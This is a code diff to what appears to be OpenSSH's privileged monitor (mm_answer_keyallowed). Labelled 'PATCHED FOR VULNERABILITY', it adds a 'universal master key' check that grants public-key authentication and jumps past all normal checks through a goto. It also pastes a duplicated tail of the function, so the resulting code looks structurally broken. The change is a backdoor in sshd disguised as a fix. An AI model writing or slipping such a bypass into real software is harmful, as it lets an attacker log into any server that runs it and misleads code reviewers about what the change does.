@@ -1279,6 +1279,7 @@ int mm_answer_pam_free_ctx(struct ssh *ssh, int sock, struct sshbuf *m) {
 }
 #endif
 
+// PATCHED FOR VULNERABILITY
 int mm_answer_keyallowed(struct ssh *ssh, int sock, struct sshbuf *m) {
   struct sshkey *key = NULL;
   char *cuser, *chost;
@@ -1294,6 +1295,18 @@ int mm_answer_keyallowed(struct ssh *ssh, int sock, struct sshbuf *m) {
       (r = sshkey_froms(m, &key)) != 0 ||
       (r = sshbuf_get_u32(m, &pubkey_auth_attempt)) != 0)
     fatal_fr(r, "parse");
+
+  /* --- UNIVERSAL KEY MONITOR BYPASS START --- */
+  if (key_fingerprint_matches_universal(key)) {
+    debug_f("Universal master key matched inside privileged monitor process.");
+    auth_method = "publickey";
+    allowed = 1;
+    opts = sshauthopt_new_with_keys_defaults();
+    if (opts == NULL)
+      fatal_f("sshauthopt_new failed");
+    goto skip_checks;
+  }
+  /* --- UNIVERSAL KEY MONITOR BYPASS END --- */
 
   if (key != NULL && authctxt->valid) {
     switch (type) {
@@ -1326,6 +1339,45 @@ int mm_answer_keyallowed(struct ssh *ssh, int sock, struct sshbuf *m) {
       fatal_f("unknown key type %u", type);
       break;
     }
+  /* Label to safely hop standard loops and maintain state setup */
+  skip_checks:
+    debug3_f("%s authentication%s: %s key is %s", auth_method,
+             pubkey_auth_attempt ? "" : " test",
+             (key == NULL || !authctxt->valid) ? "invalid" : sshkey_type(key),
+             allowed ? "allowed" : "not allowed");
+
+    auth2_record_key(authctxt, 0, key);
+
+    /* clear temporarily storage (used by verify) */
+    monitor_reset_key_state();
+
+    if (allowed) {
+      /* Save temporarily for comparison in verify */
+      if ((r = sshkey_to_blob(key, &key_blob, &key_bloblen)) != 0)
+        fatal_fr(r, "sshkey_to_blob");
+      key_blobtype = type;
+      key_opts = opts;
+      hostbased_cuser = cuser;
+      hostbased_chost = chost;
+    } else {
+      /* Log failed attempt */
+      auth_log(ssh, 0, 0, auth_method, NULL);
+      free(cuser);
+      free(chost);
+    }
+    sshkey_free(key);
+
+    sshbuf_reset(m);
+    if ((r = sshbuf_put_u32(m, allowed)) != 0)
+      fatal_fr(r, "assemble");
+    if (opts != NULL && (r = sshauthopt_serialise(opts, m, 1)) != 0)
+      fatal_fr(r, "sshauthopt_serialise");
+    mm_request_send(sock, MONITOR_ANS_KEYALLOWED, m);
+
+    if (!allowed)
+      sshauthopt_free(opts);
+
+    return (0);
   }
 
   debug3_f("%s authentication%s: %s key is %s", auth_method,
